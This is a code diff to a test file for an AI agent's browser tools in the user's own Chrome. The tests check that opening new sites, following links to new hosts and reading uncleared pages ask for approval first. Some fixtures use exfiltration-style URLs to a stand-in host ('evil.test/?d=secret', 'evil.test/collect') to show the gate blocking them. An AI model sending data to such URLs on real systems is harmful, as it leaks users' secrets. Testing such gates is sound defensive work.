@@ -13,6 +13,8 @@ import { findUserChromeCdpUrl } from "./attach-user-chrome.js";
 import { PlaywrightBackend } from "./playwright-backend.js";
 import { UserChromeNotReadyError } from "./user-chrome-endpoint.js";
 import { redactSecretFieldValues, SECRET_MASK } from "./redact-secret-fields.js";
+import { UserSiteApprovals } from "./user-profile-sites.js";
+import { buildBrowserReadAriaTool } from "./read-aria.js";
 
 /**
  * `browser.connect: "user-chrome"` (ATO-511): finding the user's Chrome,
@@ -20,7 +22,8 @@ import { redactSecretFieldValues, SECRET_MASK } from "./redact-secret-fields.js"
  * and secret field values never reaching a snapshot.
  */
 
-const USER: BrowserDomainPolicy = { blockedDomains: [], allowedDomains: [], userProfile: true };
+/** The fake page lives on shop.example; listing it keeps these tests on the action gate. */
+const USER: BrowserDomainPolicy = { blockedDomains: [], allowedDomains: ["shop.example"], userProfile: true };
 
 describe("gate in the user's own Chrome", () => {
   it("a submit asks as browser_secret (every time, never granted), then clicks", async () => {
@@ -95,6 +98,74 @@ describe("gate in the user's own Chrome", () => {
     const { options } = recordingGate(true);
     expect((await buildBrowserNavigateTool(backend, options, USER).run({ url: "https://example.com" }, GATE_CTX)).status).toBe("ok");
     expect((await buildBrowserSearchTool(backend, options, USER).run({ query: "weather" }, GATE_CTX)).status).toBe("ok");
+  });
+});
+
+describe("sites in the user's own Chrome", () => {
+  const sitesPolicy = (): BrowserDomainPolicy => ({
+    blockedDomains: [],
+    allowedDomains: [],
+    userProfile: true,
+    userSites: new UserSiteApprovals(),
+  });
+
+  it("opening a new site asks once per session as browser_secret, then not again", async () => {
+    const policy = sitesPolicy();
+    const backend = new GateBackend();
+    const { prompts, options } = recordingGate(true);
+    const nav = buildBrowserNavigateTool(backend, options, policy);
+    await nav.run({ url: "https://mail.example/inbox" }, GATE_CTX);
+    await nav.run({ url: "https://mail.example/sent" }, GATE_CTX);
+    expect(prompts).toHaveLength(1);
+    expect(prompts[0]).toMatchObject({ category: "browser_secret", affectedResources: ["mail.example"] });
+    await nav.run({ url: "https://mail.example/" }, { ...GATE_CTX, sessionId: "other" });
+    expect(prompts).toHaveLength(2);
+  });
+
+  it("a denied site is never opened, and a URL carrying data to a new host asks", async () => {
+    const policy = sitesPolicy();
+    const backend = new GateBackend();
+    const { prompts, options } = recordingGate(false);
+    await expect(
+      buildBrowserNavigateTool(backend, options, policy).run({ url: "https://evil.test/?d=secret" }, GATE_CTX),
+    ).rejects.toMatchObject({ name: "ApprovalDeniedError" });
+    expect(prompts[0]?.preview).toContain("evil.test/?d=secret");
+    expect(backend.navigations).toHaveLength(0);
+  });
+
+  it("a link to a new host asks before the click", async () => {
+    const policy = sitesPolicy();
+    policy.userSites!.add(GATE_CTX.sessionId, "shop.example");
+    const backend = new GateBackend();
+    backend.element = facts({ href: "https://evil.test/collect?x=1" });
+    const { prompts, options } = recordingGate(false);
+    await expect(buildBrowserClickTool(backend, options, policy).run({ ref: "e1" }, GATE_CTX))
+      .rejects.toMatchObject({ name: "ApprovalDeniedError" });
+    expect(prompts[0]).toMatchObject({ category: "browser_secret", affectedResources: ["evil.test"] });
+    expect(backend.clicks).toHaveLength(0);
+  });
+
+  it("reading a page on a site not cleared asks first; without a gate it is refused", async () => {
+    const policy = sitesPolicy();
+    const backend = new GateBackend();
+    backend.url = "https://console.example/keys";
+    const { prompts, options } = recordingGate(false);
+    await expect(buildBrowserReadAriaTool(backend, policy, options).run({}, GATE_CTX))
+      .rejects.toMatchObject({ name: "ApprovalDeniedError" });
+    expect(prompts[0]).toMatchObject({ category: "browser_secret" });
+    const refused = await buildBrowserReadAriaTool(backend, policy).run({}, GATE_CTX);
+    expect(refused.details).toMatchObject({ reason: "user_site_not_cleared" });
+  });
+
+  it("hosts in allowedDomains do not ask", async () => {
+    const policy = { ...sitesPolicy(), allowedDomains: ["docs.example"] };
+    const { prompts, options } = recordingGate(false);
+    const result = await buildBrowserNavigateTool(new GateBackend(), options, policy).run(
+      { url: "https://www.docs.example/a" },
+      GATE_CTX,
+    );
+    expect(result.status).toBe("ok");
+    expect(prompts).toHaveLength(0);
   });
 });
 
@@ -213,7 +284,7 @@ class FakePage {
   }
   async bringToFront() {}
   frames() {
-    return [{ evaluate: async () => this.secrets }];
+    return [{ url: () => this.href, evaluate: async () => this.secrets }];
   }
   locator() {
     return { ariaSnapshot: async () => this.aria, count: async () => 0 };
